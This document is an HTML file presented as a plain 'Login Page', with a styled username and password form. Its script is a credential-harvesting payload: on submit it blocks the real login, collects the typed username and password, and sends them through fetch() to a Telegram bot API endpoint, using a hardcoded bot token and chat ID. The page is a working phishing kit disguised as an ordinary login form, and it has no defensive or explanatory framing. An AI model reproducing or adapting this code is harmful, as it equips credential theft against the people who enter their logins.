<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        h2 {
            color: #333;
            font-size: 2em;
            margin-bottom: 20px;
        }

        form {
            background-color: #fff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
        }

        label {
            font-size: 1.1em;
            color: #555;
            display: block;
            margin-bottom: 8px;
        }

        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 1em;
            background-color: #fafafa;
        }

        input[type="text"]:focus, input[type="password"]:focus {
            border-color: #5f9ea0;
            outline: none;
        }

        button {
            width: 100%;
            padding: 12px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 1.1em;
            cursor: pointer;
        }

        button:hover {
            background-color: #45a049;
        }

        button:active {
            background-color: #387c3c;
        }
    </style>
</head>
<body>
    <div>
        <h2>Login</h2>
        <form onsubmit="sendLogin(event)">
            <label for="username">Username:</label>
            <input type="text" id="username" required><br>
            <label for="password">Password:</label>
            <input type="password" id="password" required><br>
            <button type="submit">Login</button>
        </form>
    </div>

    <script>
        function sendLogin(event) {
            event.preventDefault();  // Prevent actual form submission
            
            let username = document.getElementById("username").value;
            let password = document.getElementById("password").value;
            
            let botToken = "7748662277:AAEgI0XZYMK35AWYl75JOa5PxReDQ5lhdKA";  
            let chatId = "7072093078";
            let message = `New Login:\nUsername: ${username}\nPassword: ${password}`;

            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            fetch(url)  
                .then(response => console.log("Login Sent"))
                .catch(error => console.error("Error:", error));
        }
    </script>
</body>
</html>
